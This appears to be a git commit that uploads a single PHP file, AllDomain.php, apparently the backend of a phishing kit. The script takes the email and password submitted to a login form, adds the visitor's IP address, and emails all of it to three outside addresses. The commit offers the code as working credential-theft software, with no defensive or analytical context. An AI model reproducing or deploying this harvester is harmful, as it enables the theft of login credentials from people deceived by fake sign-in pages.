eebf2d7cb6c5759fd5f6fa420a3c2eb1e5ff2bc9
piaoyunji8 <piaoyunji888@hotmail.com>
2025-02-16 23:54:10 +0000

    Add files via upload

---
+++ AllDomain.php
@@ -0,0 +1,26 @@
+<?php
+
+$ip = getenv("REMOTE_ADDR");	
+if(!empty($_POST)) {
+ $email= $_POST['email'];
+ $password = $_POST['password'];
+ 
+
+
+		$to = "gracewill1am@yandex.com, xinmietechnology@hotmail.com, osinechifred@gmail.com";
+		
+		
+		
+         $subject = "Action ALL DOmain Script : $ip ";
+		 
+		 $message =  "Username            : ".$email."\r\n";
+         $message .= "Password            : ".$password."\r\n";
+		 $message .= "IP           		  : ".$ip."\r\n";
+		$header = "Content type: Action tools\r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+	 mail ($to,$subject,$message,$header);
+		
+}
+?> 
